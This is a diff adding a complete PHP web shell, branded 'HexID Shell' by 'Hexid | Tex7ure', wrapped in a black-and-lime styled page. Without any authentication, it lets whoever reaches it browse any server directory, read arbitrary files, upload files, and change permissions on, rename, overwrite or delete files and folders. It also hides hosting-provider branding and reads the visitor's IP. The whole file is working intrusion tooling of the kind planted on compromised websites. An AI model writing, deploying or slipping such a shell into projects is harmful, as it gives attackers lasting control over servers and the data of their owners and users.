@@ -1,0 +1,399 @@
+echo '
+<!DOCTYPE HTML>
+<html><head><script type="text/javascript">
+document.write(
+    '<link href="" rel="stylesheet" type="text/css">' +
+    '<title>HexID Shell</title>' +
+    '<link href="https://fonts.googleapis.com/css?family=Iceland" rel="stylesheet">' +
+    '<link href="https://fonts.googleapis.com/css?family=Tekno" rel="stylesheet">' +
+    '<link href="https://fonts.googleapis.com/css?family=New Rocker" rel="stylesheet">' +
+    '<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">' +
+    '<audioplayer> <source src="https://www.soundescapes.com/SESAudio/SE%20Site%20Sounds/Beep/Beep-short-01.wav" type="audio/mpeg"></audioplayer>' +
+    '<!--' +
+    'http://www.soundescapes.com/SESAudio/SE%20Site%20Sounds/Laser%20Sci%20Fi/Alien-takeoff-01.wav' +
+    'http://www.soundescapes.com/SESAudio/SE%20Site%20Sounds/Beep/Beep-short-01.wav' +
+    '-->' +
+    '<style>' +
+    'html{' +
+    '    width:100%;' +
+    '}' +
+    'body{' +
+    '    width:96%;' +
+    '    font-family: Iceland;' +
+    '    background-color: black;' +
+    '    color: white;' +
+    '}' +
+    '#content tr:hover{' +
+    '    background-color: green;' +
+    '    text-shadow: 10px 10px 10px lime;' +
+    '}' +
+    '#content .first{' +
+    '    color: black;' +
+    '    background-color: lime;' +
+    '}' +
+    'table{' +
+    '    border: 1px lime solid;' +
+    '}' +
+    'img[alt*="www.0000webhost.com"] {' +
+    '    display: none;' +
+    '}' +
+    '.kane{' +
+    '    border: 1px #000000 solid;' +
+    '    -moz-border-radius: 5px;' +
+    '    -webkit-border-radius: 5px;' +
+    '    border-radius: 5px;' +
+    '    font-weight: bold;' +
+    '}' +
+    '.filez{' +
+    '    border: 1px #000000 solid;' +
+    '    -moz-border-radius: 5px;' +
+    '    -webkit-border-radius: 5px;' +
+    '    border-radius: 5px;' +
+    '}' +
+    '.kan{' +
+    '    -moz-border-radius: 4px;' +
+    '    -webkit-border-radius: 4px;' +
+    '    border-radius: 4px;' +
+    '}' +
+    '.colz{' +
+    '    background: #011111;' +
+    '    border: 1px lime solid;' +
+    '    color: white;' +
+    '    border-radius: 5px;' +
+    '}' +
+    'a{' +
+    '    color: white;' +
+    '    text-decoration: none;' +
+    '}' +
+    'a:hover{' +
+    '    color: lime;' +
+    '    text-shadow: 0px 0px 10px #ffffff;' +
+    '}' +
+    '.blink_text {' +
+    '    -webkit-animation-name: blink; ' +
+    '    -webkit-animation-duration: 1s;' +
+    '    -webkit-animation-timing-function: step-start;' +
+    '    -webkit-animation-iteration-count: infinite;' +
+    '}' +
+    '@-webkit-keyframes blink {' +
+    '    50% { color: transparent; }' +
+    '}' +
+    '/* Place any additional styles below this comment */' +
+    '</style>'
+);
+</script>
+
+';
+
+
+
+if(isset($_GET['path'])){ 
+$path = $_GET['path'];
+}
+else{ 
+$path = getcwd();
+} 
+
+$path = str_replace('\\','/',$path);
+$paths = explode('/',$path);
+foreach($paths as $id=>$pat){ 
+if($pat == '' && $id == 0){ 
+$a = true;
+echo '<a href="?path=/">/</a>';
+continue;
+} 
+
+if($pat == '') continue;
+echo '<a href="?path=';
+for($i=0;
+$i<=$id;
+$i++){ 
+
+echo "$paths[$i]";
+if($i != $id) echo "/";
+} 
+echo '">'.$pat.'</a>/';
+} 
+echo '</td></font></tr><tr><td>';
+
+if(isset($_FILES['file'])){ 
+if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){ 
+echo '<font color="lime">Upload Succes :v</font><br />';
+}
+else{ 
+echo '<font color="red">Upload Failed</font><br/>';
+} 
+} 
+
+echo '<form enctype="multipart/form-data" method="POST">
+<font color="white">File Upload :</font> <br>
+<input class="kanez" type="file" name="file" /><font color=#0111111>llllll</font><input class="kan" type="submit" value="upload" />
+</form>
+</td></tr>';
+
+if(isset($_GET['filesrc'])){ 
+echo "<tr><td><font size='1'>Current File: ";
+echo $_GET['filesrc'];
+echo '</tr></font></td></table><br>';
+
+$html = htmlspecialchars(file_get_contents($_GET['filesrc']));
+
+echo "<from><center><textarea cols=42 rows=20 style='onfocus();color:white;background: #011111;border-radius:6px;border: 1px lime solid;' readonly>" . $html . "</textarea></center></from>";
+}
+
+/*echo('<br><table style="background: #011111;border-radius:6px;border: 1px lime solid;" width="100%" cellpadding="2" align="center"><td>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</td></table>');*/
+
+
+
+
+
+//--------------------------------------------------------------------------------
+
+//Start Modify File
+
+elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){ 
+echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
+
+
+//Chmod Permission
+
+if($_POST['opt'] == 'chmod'){ 
+if(isset($_POST['perm'])){ 
+if(chmod($_POST['path'],$_POST['perm'])){ 
+echo '<font color="lime">Change Permission Success</font><br/>';
+}
+else{ 
+echo '<font color="red">Change Permission Failed</font><br />';
+} 
+} 
+
+echo '<form method="POST">
+Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
+<input type="hidden" name="path" value="'.$_POST['path'].'">
+<input type="hidden" name="opt" value="chmod">
+<input type="submit" value="Go" />
+</form>';
+}
+
+//Rename File
+
+elseif($_POST['opt'] == 'rename'){ 
+if(isset($_POST['newname'])){ 
+if(rename($_POST['path'],$path.'/'.$_POST['newname'])){ 
+echo '<font color="lime">Ganti Nama Success</font><br/>';
+}
+else{ 
+echo '<font color="red">Ganti Nama Failed</font><br />';
+} 
+$_POST['name'] = $_POST['newname'];
+} 
+
+echo '<form method="POST">New Name : 
+<input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
+<input type="hidden" name="path" value="'.$_POST['path'].'">
+<input type="hidden" name="opt" value="rename">
+<input type="submit" value="Save" />
+</form>';
+}
+
+//Edit File
+
+elseif($_POST['opt'] == 'edit'){ 
+if(isset($_POST['src'])){ 
+$fp = fopen($_POST['path'],'w');
+if(fwrite($fp,$_POST['src'])){ 
+
+echo '<table style="background: #011111;border-radius:6px;border: 1px lime solid;" width="100%"  align="center"><td>';
+echo '<font color="lime">Success Edit File</font><br/>';
+}
+else{ 
+echo '<font color="red">Failed Edit File</font><br/></table>';
+} 
+fclose($fp);
+} 
+
+
+//Bagian Editing
+
+echo '<form method="POST">
+<textarea class="colz" cols=42 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
+<input type="hidden" name="path" value="'.$_POST['path'].'">
+<input type="hidden" name="opt" value="edit">
+<input class="kan" style="width:99%" type="submit" value="Save" />
+</form>';
+} 
+echo '</center>';
+}
+else{ 
+echo '</table><br/><center>';
+
+
+
+//Hapus Folder
+
+if(isset($_GET['option']) && $_POST['opt'] == 'delete'){ 
+if($_POST['type'] == 'dir'){ 
+if(rmdir($_POST['path'])){ 
+echo '<font color="lime">Directory Terhapus</font><br/>';
+}
+else{ 
+echo '<font color="red">Directory Failed Terhapus </font><br/>';
+}
+}
+
+
+//Hapus File
+
+elseif($_POST['type'] == 'file'){ 
+if(unlink($_POST['path'])){ 
+echo '<font color="lime">File Terhapus</font><br/>';
+}
+else{ 
+echo '<font color="red">File Failed Dihapus</font><br/>';
+} 
+} 
+} 
+echo '</center>';
+$scandir = scandir($path);
+
+
+//--------------------------------------------------------------------------------
+
+
+
+
+//Judul Dir
+
+echo '<div id="content"><table style="background: #011111;border-radius:6px;border: 1px lime solid;" width="100%" cellpadding="2"  align="center">
+<tr class="first">
+<td><center>Name</center></td>
+<td><center>SiizeFile</center></td>
+<td><center>Prmisn</center></td>
+<td><center>Modify</center></td>
+</tr>';
+
+foreach($scandir as $dir){ 
+if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
+echo '<tr><td><img src="https://cdn4.iconfinder.com/data/icons/simple-soft/512/folder-256.png" width="6%"> <a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
+<td><center>-</center></td>
+<td><center><font size="1">';
+
+if(is_writable($path.'/'.$dir)) 
+echo '<font color="lime">';
+elseif(!is_readable($path.'/'.$dir)) 
+echo '<font color="red">';
+
+echo perms($path.'/'.$dir);
+if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) 
+echo '</font>';
+echo '</center></font></td><td>
+
+
+
+<center><form method="POST" action="?option&path='.$path.'">
+<select class="kane" style="width: 40%;" name="opt">
+<option value="">#</option>
+<option value="delete">Delete</option>
+<option value="chmod">Chmod</option>
+<option value="rename">Rename</option>
+</select>
+
+<input type="hidden" name="type" value="dir">
+<input type="hidden" name="name" value="'.$dir.'">
+<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
+<input class="kane" type="submit" value=">">
+</form></center></td>
+</tr>';
+} 
+
+echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
+foreach($scandir as $file){ if(!is_file($path.'/'.$file)) continue;
+$size = filesize($path.'/'.$file)/1024;
+$size = round($size,3);
+if($size >= 1024){ $size = round($size/1024,2).' MB';
+}
+else{ 
+$size = $size.' KB';
+} 
+
+
+
+
+
+//Menu Dir
+
+echo '<tr><td>
+<img src="https://cdn3.iconfinder.com/data/icons/databases/512/copy-256.png" width="6%">
+<!--<font size="3">-->
+ <a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a><!--</font>--></td><td><center>
+
+<font size="1">'.$size.'</font></center></td>
+<td><center><font size="1">';
+
+if(is_writable($path.'/'.$file)) 
+echo '<font color="lime">';
+elseif(!is_readable($path.'/'.$file)) 
+echo '<font color="red">';
+
+echo perms($path.'/'.$file);
+if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
+
+echo '</center></font></td><td><center>
+
+
+
+<form method="POST" action="?option&path='.$path.'">
+<select class="kane" style="width: 40%;" name="opt">
+<option value="">#</option>
+<option value="delete">Delete</option>
+<option value="chmod">Chmod</option>
+<option value="rename">Rename</option>
+<option value="edit">Edit</option>
+</select>
+
+<input type="hidden" name="type" value="file">
+<input type="hidden" name="name" value="'.$file.'">
+<input type="hidden" name="path" value="'.$path.'/'.$file.'">
+<input class="kane" type="submit" value=">">
+</form></center></td>
+</tr>';
+} 
+echo '</table></div>';
+} 
+
+
+
+
+
+echo '<br/><center><table bordercolor="lime" style="border-radius:4px;width:90%;" align="center"><td>
+
+<b><center>Copyright &copy;2k19 - <font color="lime" face="New Rocker" size="2">Hexid</font> | <a href="mailto:tex7ure@yahoo.com">Tex7ure</a>
+</center></font></table</b></center>
+
+</body>
+</html>';
+
+
+$ip = getenv("REMOTE_ADDR");
+
+ function perms($file){ $perms = fileperms($file);
+ if (($perms & 0xC000) == 0xC000) { $info = 's';
+ } elseif (($perms & 0xA000) == 0xA000) { $info = 'l';
+ } elseif (($perms & 0x8000) == 0x8000) { $info = '-';
+ } elseif (($perms & 0x6000) == 0x6000) { $info = 'b';
+ } elseif (($perms & 0x4000) == 0x4000) { $info = 'd';
+ } elseif (($perms & 0x2000) == 0x2000) { $info = 'c';
+ } elseif (($perms & 0x1000) == 0x1000) { $info = 'p';
+ } else { $info = 'u';
+ } $info .= (($perms & 0x0100) ? 'r' : '-');
+ $info .= (($perms & 0x0080) ? 'w' : '-');
+ $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
+ $info .= (($perms & 0x0020) ? 'r' : '-');
+ $info .= (($perms & 0x0010) ? 'w' : '-');
+ $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
+ $info .= (($perms & 0x0004) ? 'r' : '-');
+ $info .= (($perms & 0x0002) ? 'w' : '-');
+ $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
+ return $info;
+ }
+?>
